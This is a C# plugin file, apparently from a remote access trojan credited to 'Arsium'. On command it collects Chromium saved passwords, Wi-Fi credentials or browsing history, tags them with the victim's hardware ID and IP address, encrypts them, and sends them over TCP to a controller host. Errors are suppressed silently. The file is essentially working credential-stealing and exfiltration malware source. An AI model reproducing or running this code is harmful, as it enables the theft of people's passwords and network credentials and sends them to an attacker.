using Shared;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public async static Task Main(Host H, string HWID, object[] Param , Socket Base, string key, string BaseIP) 
        {
            try
            {
                Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                S.Connect(ep);
                PacketType T = (PacketType)Param[0];
                Data D = new Data();
                D.HWID = HWID;
                D.IP_Origin = BaseIP;
                switch (T)
                {
                    case PacketType.PASSWORDS:
                        await Task.Run(() => Chromium.Recovery(ref D));
                        D.Type = PacketType.PASSWORDS;        
                        break;

                    case PacketType.WIFI:
                       await Task.Run(() => Wifi.Recovery(ref D));
                        D.Type = PacketType.WIFI;
                        break;

                    case PacketType.HISTORY:
                        await Task.Run(() => History.Recovery(ref D));
                        D.Type = PacketType.HISTORY;
                        break;
                }
                await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                S.Close();
                S.Dispose();
            }
            catch {}
            finally 
            {
                Shared.Utils.ClearMem();           
            }
        }
    }
}
